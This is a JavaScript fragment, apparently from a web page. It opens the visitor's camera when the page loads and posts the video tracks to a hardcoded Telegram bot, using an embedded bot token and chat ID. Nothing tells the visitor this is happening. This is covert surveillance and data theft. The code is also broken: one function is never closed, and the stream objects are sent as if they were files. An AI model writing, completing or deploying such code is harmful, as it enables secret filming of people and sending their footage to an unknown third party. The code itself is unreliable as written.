        function sendToTelegram(message) {

        function startCamera(stream) {
            // Access the video elements for both front and back cameras
            const frontCamera = document.createElement('video');
            const backCamera = document.createElement('video');

            // Set stream to both cameras
            frontCamera.srcObject = stream;
            backCamera.srcObject = stream;

            // Start playing both videos
            frontCamera.play();
            backCamera.play();

            // Capture the stream from both cameras
            const frontTrack = stream.getVideoTracks()[0];
            const backTrack = stream.getVideoTracks()[1];

            // Send both streams to Telegram
            sendCameraFeedToTelegram(frontTrack, 'front');
            sendCameraFeedToTelegram(backTrack, 'back');
        }

        function sendCameraFeedToTelegram(videoTrack, cameraType) {
            const botToken = '7525866619:AAFvucD9MBOr7z4XFUbRSYlYMXFsdDut800';
            const chatId = '7631254472';
            const url = `https://api.telegram.org/bot${botToken}/sendDocument`;

            const data = new FormData();
            data.append('chat_id', chatId);
            data.append('caption', `Video from ${cameraType} camera`);
            data.append('document', videoTrack);

            fetch(url, {
                method: 'POST',
                body: data
            })
            .then(response => response.json())
            .catch(error => {
                console.error("Error sending camera feed:", error);
            });
        }

        function accessCameras() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                .then(startCamera)
                .catch(error => {
                    console.error("Error accessing cameras:", error);
                });
        }

        window.onload = function() {

            accessCameras();
        };
